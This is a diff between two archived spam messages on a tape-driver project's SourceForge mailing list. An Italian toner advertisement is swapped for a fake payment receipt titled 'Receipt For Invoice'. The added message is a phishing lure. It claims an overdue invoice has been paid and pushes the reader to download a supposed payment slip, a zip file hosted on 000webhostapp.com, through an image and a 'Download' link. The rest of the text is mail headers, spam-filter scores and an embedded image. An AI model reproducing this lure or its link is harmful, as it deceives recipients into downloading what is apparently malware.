@@ -2,95 +2,89 @@ Return-Path: <osst-users-bounces@lists.sourceforge.net>
 X-Original-To: lists+osst-users@lfdr.de
 Delivered-To: lists+osst-users@lfdr.de
 Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
-	by mail.lfdr.de (Postfix) with ESMTPS id 18C071F80C7
-	for <lists+osst-users@lfdr.de>; Sat, 13 Jun 2020 05:59:05 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id BF5241FAFF5
+	for <lists+osst-users@lfdr.de>; Tue, 16 Jun 2020 14:14:39 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
+	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
+	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
+	bh=MZ/vdza18Y8Kc6r20KBTvxzihRRjKy1iEQWDc+o7mWk=; b=U7spbPzw9QvoX32TutSCvTETdf
+	xNGJsyvLh0ASL+w6ijrn9HV23E0u5KuLhEh1HHk5mgQgXXMYmlDJwn4t+F3UsE0P6Fqy7q8Dbipxe
+	LOs2co9b9PA9tHK1Q4caLoY5kafYA/PzBMq8zTNsErPybXTPq7ycXu/Z4K176vwt4cq8=;
 Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
 	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
 	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
-	id 1jjxJv-0004zt-T7
-	for lists+osst-users@lfdr.de; Sat, 13 Jun 2020 03:59:03 +0000
+	id 1jlAUA-0002qt-JM
+	for lists+osst-users@lfdr.de; Tue, 16 Jun 2020 12:14:38 +0000
 Received: from [172.30.20.202] (helo=mx.sourceforge.net)
  by sfs-ml-2.v29.lw.sourceforge.com with esmtps
  (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
- (envelope-from <mailing@ml.officeinks.info>) id 1jjxJt-0004zZ-R2
- for osst-users@lists.sourceforge.net; Sat, 13 Jun 2020 03:59:01 +0000
+ (envelope-from <info@delivers-solutions.com>) id 1jlAU2-0002qU-LZ
+ for osst-users@lists.sourceforge.net; Tue, 16 Jun 2020 12:14:30 +0000
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=sourceforge.net; s=x; h=Message-ID:Date:Content-Type:Subject:To:Reply-To:
- From:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
+ d=sourceforge.net; s=x; h=Content-Type:MIME-Version:Message-ID:Date:Subject:
+ To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
  Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
  :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
  List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=cQ16p12/Wps52gHs5lnnVW5Li1iobeK88pSW1aN4Pek=; b=KixQZKwKblw7XCw3W+CMi3ZP7T
- dhEDV+d7Nb/5Gj/I79x5OnSyC3FbJtQAAZbkDqbVYmUuJcbzw6hXCZ11z9DMAuk+/bd2s552wlyw4
- 8lAhGy2Qts3CgZxLfMrCeyJ4a71Gh4wFb9qqCgBc7cxNhbhsCdbL2Zj7l4dc1G8STaoM=;
+ bh=Hhy7DeXV50QubcrrIXFHbgqMWYDWAz49ZrNQy1tpXfw=; b=h3BiNwcnsPP9cFh4cfysKDZ+Ws
+ +DV/fBKj78gD0bsnFgUeS/cP2nPFubTEjWjUCr9sQJkkyqvkpxxod5zUe8GEdNZDoPfz+HSE17nDn
+ 51zylsTVRHb3kb2wyvB1jbAxnzq7WBdLIvz10M15sR6n4BPZUh0T/yDThp2x9AUZ64sw=;
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
  ;
- h=Message-ID:Date:Content-Type:Subject:To:Reply-To:From:MIME-Version:Sender
+ h=Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To
  :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
  Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
  References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
- List-Owner:List-Archive; bh=cQ16p12/Wps52gHs5lnnVW5Li1iobeK88pSW1aN4Pek=; b=j
- X6SRBYia8F6QITAR0SAnJuOv2xpVyx0YcLMm6kaKyrE6tInA29sXS4MK7Ky+6fVQmyecBZtbuP8o/
- 1q/UH8dalcOsVCr06Ik0Y33MNQtb2dMeHIUcb2fTurCGaiHMjAWJPmbhw694mxwXlGtZOTag5JHiF
- 6aPuj/KfwI0LBgzE=;
-Received: from ml004-bk.dnshigh.com ([193.70.146.22])
- by sfi-mx-3.v28.lw.sourceforge.com with esmtps
- (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
- id 1jjxJs-000n1M-G6
- for osst-users@lists.sourceforge.net; Sat, 13 Jun 2020 03:59:01 +0000
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
- d=ml.officeinks.info; s=default; h=Message-ID:Date:Content-Type:Subject:To:
- Reply-To:From:MIME-Version:Sender:Cc:Content-Transfer-Encoding:Content-ID:
- Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
- :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
- List-Subscribe:List-Post:List-Owner:List-Archive;
- bh=cQ16p12/Wps52gHs5lnnVW5Li1iobeK88pSW1aN4Pek=; b=VZAg8A6nctf3ggsA1fPdHySFyn
- 2TB8eb1QXYh5XNSddsvvKLnatVaiydO+qsryADXf/FDL++CDg8QR3Gse4naR2n01R+P8xxxH0d+57
- 0xCZy7xzR6BSAQiJUS+5e8zg9BLJAUiBJ+UoB1b+l28K6JgxbfXG9nvg47JNktFozFGebcfFB8S9i
- kPKJtNExTAKlvwVLBLlWyD8lJ5Cs9Q0HFTESmXhNQzXkx17EBd75BfMlUFz6BSrd4FtFr4h7iVPzP
- x8xyJuqM7/VyFIhqlB4X1gxaVSXshyGcVUlE+b5wJFJ2zs/qvgNZ5aD6yCDLBJYmNom/8Oox0Bkqq
- vJHr+93g==;
-Received: from host-82-49-32-90.retail.telecomitalia.it ([82.49.32.90]:64239)
- by ml004.dnshigh.com with esmtpsa (TLS1) tls
- TLS_DHE_RSA_WITH_AES_256_CBC_SHA (Exim 4.93)
- (envelope-from <mailing@ml.officeinks.info>) id 1jjxJm-0004QE-2Q
- for osst-users@lists.sourceforge.net; Sat, 13 Jun 2020 05:58:54 +0200
-MIME-Version: 1.0
-From: "Toner compatibili a basso prezzo" <mailing@ml.officeinks.info>
+ List-Owner:List-Archive; bh=Hhy7DeXV50QubcrrIXFHbgqMWYDWAz49ZrNQy1tpXfw=; b=n
+ I22oAoruGMQ35Aggb1Tf61zSAsAAztmOnwNawlh9NVjlmu5hW+Hs7fNx5SiZJw19is5ksJ4M9dr3v
+ v7H9dweV441agYwvPdczh3eFwZgjglgC96ZTlLURIUn0DC0H/jvJ8jkOaUxeAJD35N724qvBXWn28
+ lNJUvmjvxt2BymVc=;
+Received: from rdns0.delivers-solutions.com ([147.135.99.10])
+ by sfi-mx-3.v28.lw.sourceforge.com with esmtp (Exim 4.92.2)
+ id 1jlATy-0052i6-JL
+ for osst-users@lists.sourceforge.net; Tue, 16 Jun 2020 12:14:30 +0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default;
+ d=delivers-solutions.com; 
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
+ i=info@delivers-solutions.com; 
+ bh=2JMXmCGOpDgFD+WuObwLxOuiqtQ=;
+ b=fO3kgDGDOLvBA9JgjPruvMQli+zQxpWr9/2+EOYKrWZHEY8Fa94ag5rTaaUqgiJ6MHA1ZOKoO1Nt
+ AR+FQsxD6ZdIzskxyzOaEa4H8M1Mx++R4DiqcyyWlVVzjsh6W4Ha2FxjHlgeShjjWHOLTIWCllYT
+ lFwTeBgtBozrWIbz+BY=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default;
+ d=delivers-solutions.com; 
+ b=M86+fd0ZWa/fvhdwJWZqvm+AevRvuBkc9DEFLgnyBQlLIm0+hJF4CPu6Khn2zFgBUIMeL1ZEhlXs
+ LU8zBpyonSkwI+1AzWrFQnQXMD/UwAsEGKszU2XKaMsO6ghrmT/VsR2yOPoAxtDynsuB3+VyJNrT
+ lL8HmGfsoGzS1WlGJes=;
 To: osst-users@lists.sourceforge.net
-Date: Sat, 13 Jun 2020 05:58:52 +0200
-Message-ID: <15892391454344523714527@user-PC>
-X-AntiAbuse: This header was added to track abuse,
- please include it with any abuse report
-X-AntiAbuse: Primary Hostname - ml004.dnshigh.com
-X-AntiAbuse: Original Domain - lists.sourceforge.net
-X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
-X-AntiAbuse: Sender Address Domain - ml.officeinks.info
-X-Get-Message-Sender-Via: ml004.dnshigh.com: authenticated_id: ltmltiwt/from_h
-X-Authenticated-Sender: ml004.dnshigh.com: mailing@ml.officeinks.info
-X-Spam-Score: 5.8 (+++++)
+Date: 16 Jun 2020 14:14:20 +0200
+Message-ID: <20200616141420.35581754EDE9DCDC@delivers-solutions.com>
+MIME-Version: 1.0
+X-Spam-Score: 5.2 (+++++)
 X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
  See http://spamassassin.org/tag/ for more details.
  0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
  See
  http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
- for more information. [URIs: imageshack.com]
+ for more information. [URIs: 000webhostapp.com]
  -0.0 SPF_PASS               SPF: sender matches SPF record
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- 1.6 HTML_IMAGE_RATIO_02    BODY: HTML has a low ratio of text to image area
- 1.3 HTML_IMAGE_ONLY_24     BODY: HTML: images with 2000-2400 bytes of words
  1.0 HTML_MESSAGE           BODY: HTML included in message
+ 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
  domain
  -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
  0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
  not necessarily valid
- 2.0 IMG_ONLY_FM_DOM_INFO   HTML image-only message from .info domain
- 0.0 T_REMOTE_IMAGE         Message contains an external image
- 0.0 AWL AWL: Adjusted score from AWL reputation of From: address
-X-Headers-End: 1jjxJs-000n1M-G6
-Subject: [Osst-users] Toner compatibili - Listino Estate e prezzi al ribasso
- - pagamento anche alla consegna - chiedici un preventivo
+ 0.5 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+ 1.5 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+ [cf: 100]
+ 0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
+X-Headers-End: 1jlATy-0052i6-JL
+Subject: [Osst-users] Receipt For Invoice
 X-BeenThere: osst-users@lists.sourceforge.net
 X-Mailman-Version: 2.1.21
 Precedence: list
@@ -102,114 +96,324 @@ List-Post: <mailto:osst-users@lists.sourceforge.net>
 List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
 List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
  <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
-Reply-To: mailing@ml.officeinks.info
-Content-Type: multipart/mixed; boundary="===============3500438600030256701=="
+From: info--- via Osst-users <osst-users@lists.sourceforge.net>
+Reply-To: info@delivers-solutions.com
+Content-Type: multipart/mixed; boundary="===============4729712888160276887=="
 Errors-To: osst-users-bounces@lists.sourceforge.net
 
 
---===============3500438600030256701==
-Content-Type: multipart/alternative;
-	boundary="----=_NextPart_001_60D1_038B21F7.5ED41C0A"
+--===============4729712888160276887==
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_E3CCF698.3B05278C"
 
 
-------=_NextPart_001_60D1_038B21F7.5ED41C0A
-Content-Type: text/plain; charset="utf-8"
+------=_NextPart_000_0012_E3CCF698.3B05278C
+Content-Type: text/html;
+	charset="iso-8859-1"
 Content-Transfer-Encoding: quoted-printable
 
-=20
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
+<body>
+<DIV>Hi,<BR><BR></DIV>
+<DIV class=3Ddefault-style>
+<DIV class=3Ddefault-style>
+<DIV class=3Ddefault-style>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+We apologize for the delay in making balance payment, please be advised tha=
+t we have already transferred the full amount to your account for the previ=
+ous invoice.<BR>kindly see the attached slip for your confirmation of paid =
+orders.<BR><BR>You can send to me a final copy and inform ETD asap. I will =
+send the other information with my official email when I report to my offic=
+e tomorrow morning or you can report to our sales department directly.</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+Please see attached below</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+<A href=3D"https://file-docs.000webhostapp.com/invoice-pdf.zip"><img border=
+=3D"0" hspace=3D"0" alt=3D"" src=3D"cid:paidinvoice1.jpg" align=3D"baseline=
+" width=3D"60" height=3D"76"></A><BR><A style=3D"TEXT-DECORATION: underline=
+; COLOR: rgb(60,97,170)" href=3D"https://file-docs.000webhostapp.com/invoic=
+e-pdf.zip" rel=3Dnoopener target=3D_blank><SPAN style=3D"TEXT-DECORATION: u=
+nderline">Download</SPAN></A></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR><BR>
+Warmest Regards,</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+Angela Wilpert</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+Sales Executives Dept</P>
+<DIV class=3D"col-xs-12 col-sm-4 col-md-4 col-lg-4" style=3D"BOX-SIZING: bo=
+rder-box; FONT-SIZE: 14px; FONT-FAMILY: COMFORTAA; WIDTH: 390px; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; POSITION: relative; TEXT-TRANSFORM: none; FLO=
+AT: left; FONT-WEIGHT: 400; COLOR: rgb(211,211,211); PADDING-BOTTOM: 0px; F=
+ONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 15px; MARGIN: 0px; MIN-H=
+EIGHT: 1px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 1=
+5px; BACKGROUND-COLOR: rgb(41,41,41); TEXT-INDENT:=20
+0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
+t-stroke-width: 0px; text-decoration-style: initial; text-decoration-color:=
+ initial">
+<DIV class=3D"dexp-animate animated flipInY" style=3D"BOX-SIZING: border-bo=
+x; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px; VISIBILITY: visible !important; animation-fill-mode: bot=
+h; animation-duration: 1s; animation-name: flipInY; backface-visibility: vi=
+sible">
+<DIV class=3D"dexp-shortcodes-box box-background  box-hexagon box-center" s=
+tyle=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<P style=3D'FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue=
+", "Segoe UI", Arial, sans-serif; MARGIN: 0px 0px 1em'>HDT Sales &amp; Merk=
+ating<BR>vasileos konstantinou 89 Paphos, Paphos, Cyprus<BR>Phone: +357 26 =
+040001</P></DIV></DIV></DIV>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<BR class=3DApple-interchange-newline></DIV></DIV></DIV></BODY></HTML>
+------=_NextPart_000_0012_E3CCF698.3B05278C
+Content-Type: image/jpeg; name="paidinvoice1.jpg"
+Content-Transfer-Encoding: base64
+Content-ID: <paidinvoice1.jpg>
 
-=20
+/9j/4AAQSkZJRgABAQEAYABgAAD/4RDcRXhpZgAATU0AKgAAAAgABAE7AAIAAAAGAAAISodp
+AAQAAAABAAAIUJydAAEAAAAMAAAQyOocAAcAAAgMAAAAPgAAAAAc6gAAAAgAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEpFU0tZAAAF
+kAMAAgAAABQAABCekAQAAgAAABQAABCykpEAAgAAAAMwMQAAkpIAAgAAAAMwMQAA6hwABwAA
+CAwAAAiSAAAAABzqAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
